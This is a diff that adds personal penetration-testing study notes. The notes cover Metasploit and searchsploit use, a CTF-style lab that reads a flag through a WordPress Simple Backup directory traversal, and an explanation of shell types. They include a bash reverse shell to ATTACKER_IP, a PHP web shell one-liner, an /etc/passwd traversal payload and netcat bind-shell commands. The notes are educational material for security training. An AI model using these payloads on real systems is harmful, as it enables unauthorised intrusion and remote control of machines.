@@ -1312,3 +1312,1076 @@ whatweb IP
 - SMB provides commands similar to Linux such as `ls` and `cd`.
 - `get` downloads files from the remote SMB share to the local machine.
 - After downloading a file, use Linux commands such as `cat` to read its contents.
+---
+# Public Exploits & Metasploit
+
+## Goal
+
+After identifying a service and its version during Enumeration, search for publicly available exploits before attempting manual exploitation.
+
+---
+
+# Exploitation Workflow
+
+```
+Nmap Scan
+↓
+
+Identify Service + Version
+
+↓
+
+Search for Public Exploits
+
+↓
+
+Validate the Exploit
+
+↓
+
+Configure the Exploit
+
+↓
+
+Check Vulnerability
+
+↓
+
+Run Exploit
+
+↓
+
+Gain Shell
+
+↓
+
+Post-Exploitation
+```
+
+---
+
+# Public Exploits
+
+## Purpose
+
+Public exploits are exploit codes released by security researchers for known vulnerabilities.
+
+They may target:
+
+- Operating Systems
+- Web Applications
+- Network Services
+- CMS
+- Plugins
+- Databases
+
+---
+
+# Finding Public Exploits
+
+## Google
+
+Search using:
+
+```
+<Application Name> exploit
+```
+
+Examples
+
+```
+OpenSSH 7.2 exploit
+```
+
+```
+Apache 2.4.41 exploit
+```
+
+```
+WordPress plugin exploit
+```
+
+---
+
+## Searchsploit
+
+### Purpose
+
+Search local copies of Exploit-DB.
+
+---
+
+### Install
+
+```bash
+sudo apt install exploitdb -y
+```
+
+---
+
+### Search
+
+```bash
+searchsploit openssh 7.2
+```
+
+Example Output
+
+```text
+OpenSSH 7.2 Username Enumeration
+
+OpenSSH 7.2 Command Injection
+
+OpenSSH 7.2 DoS
+```
+
+---
+
+## Other Resources
+
+- Exploit-DB
+- Rapid7
+- GitHub
+- Google
+
+---
+
+# Metasploit Framework (MSF)
+
+## Purpose
+
+Metasploit is a penetration testing framework that contains:
+
+- Public Exploits
+- Payloads
+- Auxiliary Modules
+- Post-Exploitation Modules
+- Meterpreter
+
+---
+
+## Start Metasploit
+
+```bash
+msfconsole
+```
+
+---
+
+# Search for Exploits
+
+```bash
+search eternalblue
+```
+
+or
+
+```bash
+search ms17
+```
+
+---
+
+# Select an Exploit
+
+```bash
+use exploit/windows/smb/ms17_010_psexec
+```
+
+---
+
+# Show Required Options
+
+```bash
+show options
+```
+
+---
+
+# Important Options
+
+## RHOSTS
+
+Target IP Address.
+
+Example
+
+```bash
+set RHOSTS 10.10.10.40
+```
+
+---
+
+## LHOST
+
+Your attack machine IP.
+
+Usually
+
+```bash
+set LHOST tun0
+```
+
+---
+
+# Verify the Vulnerability
+
+If supported, verify the target before exploitation.
+
+```bash
+check
+```
+
+Possible Output
+
+```text
+Host is likely VULNERABLE
+```
+
+---
+
+# Run the Exploit
+
+```bash
+run
+```
+
+or
+
+```bash
+exploit
+```
+
+---
+
+# Meterpreter
+
+## Purpose
+
+Advanced shell provided by Metasploit.
+
+Allows:
+
+- Execute commands
+- Upload files
+- Download files
+- Pivoting
+- Post-Exploitation
+- Privilege Escalation
+
+---
+
+## Drop to a Normal Shell
+
+```bash
+shell
+```
+
+---
+
+## Check Current User
+
+```bash
+whoami
+```
+
+Example
+
+```text
+NT AUTHORITY\SYSTEM
+```
+
+---
+
+# Common Metasploit Commands
+
+| Command | Purpose |
+|----------|----------|
+| `msfconsole` | Start Metasploit |
+| `search <name>` | Search for modules |
+| `use <module>` | Select a module |
+| `show options` | Display required options |
+| `set RHOSTS IP` | Set target IP |
+| `set LHOST tun0` | Set attacker IP |
+| `check` | Verify if the target is vulnerable |
+| `run` | Execute the exploit |
+| `exploit` | Execute the exploit |
+| `shell` | Spawn a normal shell |
+| `whoami` | Show current user |
+
+---
+
+# Best Practices
+
+- Always verify the service version before selecting an exploit.
+- Read the exploit description before using it.
+- Use `check` when available.
+- Do not rely only on Metasploit.
+- Be prepared to modify or use PoC exploits manually if needed.
+
+---
+
+# What I Learned
+
+- Enumeration comes before Exploitation.
+- Searchsploit helps locate public exploits locally.
+- Metasploit simplifies exploitation but should not be your only tool.
+- Configure required options before running an exploit.
+- Meterpreter provides powerful post-exploitation capabilities.
+- A successful exploit often leads to an interactive shell for further testing.
+---
+# Lab - Public Exploits (WordPress Simple Backup)
+
+## Objective
+
+Identify the services running on the target, search for public exploits, and retrieve the contents of `/flag.txt`.
+
+---
+
+# Step 1 - Service Enumeration
+
+## HTTP Header Enumeration
+
+```bash
+curl -I http://154.57.164.70:32587
+```
+
+Output
+
+```http
+HTTP/1.1 200 OK
+Server: Apache/2.4.41 (Ubuntu)
+Link: <http://154.57.164.70:32587/index.php/wp-json/>; rel="https://api.w.org/"
+```
+
+### Findings
+
+- Apache 2.4.41
+- WordPress detected via `wp-json`
+
+> **Note:** `wp-json` is the REST API endpoint used by WordPress and is a strong indicator that the target is running WordPress.
+
+---
+
+# Step 2 - Initial Mistake
+
+I first searched for Apache exploits.
+
+```bash
+searchsploit "Apache 2.4.41"
+```
+
+Many unrelated exploits were returned.
+
+### Lesson Learned
+
+The web server (Apache) is not always the vulnerable component.
+
+A web application may be running on top of Apache.
+
+```
+Apache
+↓
+
+WordPress
+
+↓
+
+Plugin
+
+↓
+
+Plugin Version
+```
+
+Always identify the application before searching for exploits.
+
+---
+
+# Step 3 - Identify the Application
+
+Browsing the website revealed:
+
+```
+Simple Backup Plugin 2.7.10
+```
+
+The target was running:
+
+- WordPress
+- Simple Backup Plugin
+- Version 2.7.10
+
+---
+
+# Step 4 - Search for Public Exploits
+
+Incorrect search
+
+```bash
+searchsploit Wordpress 2.7.10
+```
+
+Returned generic WordPress exploits.
+
+---
+
+Correct search
+
+```bash
+searchsploit "Simple Backup"
+```
+
+Output
+
+```text
+WordPress Plugin Simple Backup 2.7.11 - Multiple Vulnerabilities
+```
+
+---
+
+# Step 5 - Read the PoC
+
+Open the exploit.
+
+```bash
+searchsploit -x 39883
+```
+
+The PoC described two vulnerabilities.
+
+## 1. Arbitrary File Deletion
+
+Not useful for this lab.
+
+---
+
+## 2. Arbitrary File Download
+
+This vulnerability allows downloading files from the server without authentication.
+
+Example from the PoC
+
+```
+download_backup_file=oldBackups/../../../../../../etc/passwd
+```
+
+### Vulnerability Type
+
+- Directory Traversal
+- Arbitrary File Download
+
+---
+
+# Step 6 - Metasploit
+
+Search for the module.
+
+```bash
+msfconsole
+```
+
+```bash
+search "simple backup"
+```
+
+Output
+
+```text
+auxiliary/scanner/http/wp_simple_backup_file_read
+```
+
+Load the module.
+
+```bash
+use 0
+```
+
+Show required options.
+
+```bash
+show options
+```
+
+Configure the module.
+
+```bash
+set RHOSTS 154.57.164.70
+```
+
+```bash
+set RPORT 32587
+```
+
+```bash
+set TARGETURI /
+```
+
+```bash
+set FILEPATH /flag.txt
+```
+
+Run the module.
+
+```bash
+run
+```
+
+The module successfully retrieved the contents of `/flag.txt`.
+
+---
+
+# Key Concepts Learned
+
+## Enumeration comes first
+
+Always identify:
+
+- Service
+- Application
+- Plugin
+- Version
+
+before searching for exploits.
+
+---
+
+## Apache is not always the target
+
+Apache only serves the application.
+
+The vulnerability may exist in:
+
+- WordPress
+- Joomla
+- Drupal
+- Plugins
+- Themes
+
+rather than Apache itself.
+
+---
+
+## WordPress Fingerprints
+
+Indicators that the target is running WordPress:
+
+- `/wp-json/`
+- `/wp-admin/`
+- `/wp-login.php`
+- `/wp-content/`
+- `/wp-content/plugins/`
+- `xmlrpc.php`
+
+---
+
+## Reading a PoC
+
+When reading a PoC, identify:
+
+1. Vulnerability type
+2. Authentication required?
+3. Vulnerable parameter
+4. Payload
+5. Expected result
+
+---
+
+## Search Strategy
+
+❌ Wrong
+
+```
+Apache exploit
+```
+
+❌ Wrong
+
+```
+WordPress exploit
+```
+
+✅ Correct
+
+```
+Plugin exploit
+```
+
+Search from the most specific component.
+
+```
+Service
+↓
+
+Application
+
+↓
+
+Plugin
+
+↓
+
+Version
+```
+
+---
+
+# Commands Used
+
+```bash
+curl -I http://IP
+```
+
+```bash
+searchsploit "Simple Backup"
+```
+
+```bash
+searchsploit -x 39883
+```
+
+```bash
+msfconsole
+```
+
+```bash
+search "simple backup"
+```
+
+```bash
+use 0
+```
+
+```bash
+show options
+```
+
+```bash
+set RHOSTS IP
+```
+
+```bash
+set RPORT PORT
+```
+
+```bash
+set TARGETURI /
+```
+
+```bash
+set FILEPATH /flag.txt
+```
+
+```bash
+run
+```
+
+---
+
+# What I Learned
+
+- Enumeration is more important than immediately using Metasploit.
+- Identify the application before searching for exploits.
+- `wp-json` is a reliable WordPress fingerprint.
+- Read the PoC before using an exploit.
+- Focus on the most specific component (plugin) rather than the web server.
+- Metasploit modules are useful, but understanding the vulnerability is more important than simply running a module.
+---
+# Types of Shells
+
+## Objective
+
+Learn the three main shell types used after exploiting a target:
+
+- Reverse Shell
+- Bind Shell
+- Web Shell
+
+Understand when and how each shell is used.
+
+---
+
+# What is a Shell?
+
+A shell provides interactive command-line access to a compromised system.
+
+Instead of executing one command at a time through an exploit, a shell allows continuous interaction with the target.
+
+Example:
+
+```bash
+id
+pwd
+ls
+cat /etc/passwd
+```
+
+---
+
+# Reverse Shell
+
+## Description
+
+The target initiates a connection back to the attacker's machine.
+
+```
+Victim  ─────────────►  Attacker
+```
+
+This is the most common shell used during penetration testing.
+
+---
+
+## Step 1 - Start a Listener
+
+```bash
+nc -lvnp 1234
+```
+
+### Netcat Options
+
+| Option | Description |
+|---------|-------------|
+| `-l` | Listen for incoming connections |
+| `-v` | Verbose output |
+| `-n` | Disable DNS resolution |
+| `-p` | Listening port |
+
+---
+
+## Step 2 - Find Your VPN IP
+
+```bash
+ip a
+```
+
+Use the IP address on the **tun0** interface when working on HTB.
+
+Example:
+
+```
+10.10.14.44
+```
+
+---
+
+## Step 3 - Execute Reverse Shell Payload
+
+Linux (Bash)
+
+```bash
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
+```
+
+Windows (PowerShell)
+
+```powershell
+powershell reverse shell
+```
+
+(Usually generated from PayloadsAllTheThings.)
+
+---
+
+## Result
+
+The victim connects back to our Netcat listener.
+
+```
+Victim ─────► nc -lvnp 1234
+```
+
+We receive an interactive shell.
+
+---
+
+## Advantages
+
+- Very common.
+- Fast to obtain.
+- Works well after RCE.
+
+## Disadvantages
+
+- Connection is fragile.
+- If disconnected, the exploit must usually be executed again.
+
+---
+
+# Bind Shell
+
+## Description
+
+The target opens a listening port.
+
+The attacker connects to it.
+
+```
+Attacker ─────────► Victim
+```
+
+---
+
+## Bind Shell Command
+
+Example:
+
+```bash
+nc -lvp 1234
+```
+
+(on the target)
+
+---
+
+## Connect
+
+```bash
+nc TARGET_IP 1234
+```
+
+---
+
+## Advantages
+
+- Easy to reconnect if disconnected.
+
+## Disadvantages
+
+- Firewalls often block inbound connections.
+- Less common than Reverse Shell.
+
+---
+
+# Reverse vs Bind
+
+| Reverse Shell | Bind Shell |
+|----------------|------------|
+| Victim connects to attacker | Attacker connects to victim |
+| More common | Less common |
+| Better against firewalls | Often blocked |
+
+---
+
+# Web Shell
+
+## Description
+
+A Web Shell is a script uploaded to the web server that executes operating system commands through HTTP requests.
+
+---
+
+## PHP Web Shell
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+---
+
+## Upload
+
+Example:
+
+```
+shell.php
+```
+
+---
+
+## Execute Commands
+
+Browser
+
+```
+http://TARGET/shell.php?cmd=id
+```
+
+or
+
+```bash
+curl http://TARGET/shell.php?cmd=id
+```
+
+Output:
+
+```
+uid=33(www-data)
+```
+
+---
+
+## Advantages
+
+- Works through HTTP/HTTPS.
+- Survives server reboot if the file remains.
+- Does not require opening a new TCP port.
+
+## Disadvantages
+
+- Less interactive.
+- One HTTP request per command.
+
+---
+
+# Default Webroots
+
+| Web Server | Default Webroot |
+|------------|-----------------|
+| Apache | `/var/www/html/` |
+| Nginx | `/usr/local/nginx/html/` |
+| IIS | `C:\inetpub\wwwroot\` |
+| XAMPP | `C:\xampp\htdocs\` |
+
+---
+
+# Upgrading a Reverse Shell
+
+A basic Netcat shell has limitations:
+
+- No command history.
+- No TAB completion.
+- Arrow keys do not work.
+
+Upgrade it to a full TTY.
+
+---
+
+## Spawn a TTY
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## Background Shell
+
+```
+CTRL + Z
+```
+
+---
+
+## Configure Terminal
+
+```bash
+stty raw -echo
+```
+
+---
+
+## Return to Shell
+
+```bash
+fg
+```
+
+Press Enter.
+
+---
+
+## Reset Terminal
+
+```bash
+reset
+```
+
+---
+
+## Fix Terminal Type
+
+```bash
+export TERM=xterm-256color
+```
+
+---
+
+## Get Terminal Size
+
+Local machine:
+
+```bash
+stty size
+```
+
+Example:
+
+```
+67 318
+```
+
+---
+
+Remote shell:
+
+```bash
+stty rows 67 columns 318
+```
+
+---
+
+# When to Use Each Shell
+
+| Shell | Typical Scenario |
+|--------|------------------|
+| Reverse Shell | After Remote Code Execution (RCE) |
+| Bind Shell | When the attacker can reach the target directly |
+| Web Shell | After File Upload or Web RCE |
+
+---
+
+# Important Notes
+
+- Reverse Shell is the most common shell in penetration testing.
+- HTB machines usually require using the **tun0** VPN IP.
+- A Web Shell communicates through HTTP instead of opening a new TCP connection.
+- Not every vulnerability leads to a shell.
+
+---
+
+# Vulnerability vs Shell
+
+| Vulnerability | Shell? |
+|--------------|--------|
+| XSS | ❌ |
+| IDOR | ❌ |
+| SQL Injection | Sometimes |
+| Directory Traversal | ❌ |
+| File Read | ❌ |
+| RCE | ✅ |
+| Command Injection | ✅ |
+
+---
+
+# Typical Workflow
+
+```
+Find RCE
+        │
+        ▼
+Start Netcat Listener
+        │
+        ▼
+Execute Reverse Shell Payload
+        │
+        ▼
+Gain Shell
+        │
+        ▼
+Upgrade to TTY
+        │
+        ▼
+Privilege Escalation
+```
+
+---
+
+# Key Takeaways
+
+- A shell provides interactive access to the target system.
+- Reverse Shell is the most frequently used shell.
+- Bind Shell works in the opposite direction of Reverse Shell.
+- Web Shell executes commands through HTTP requests.
+- Upgrade Netcat shells to a full TTY for better usability.
+- Shell access is usually the first step before Privilege Escalation.
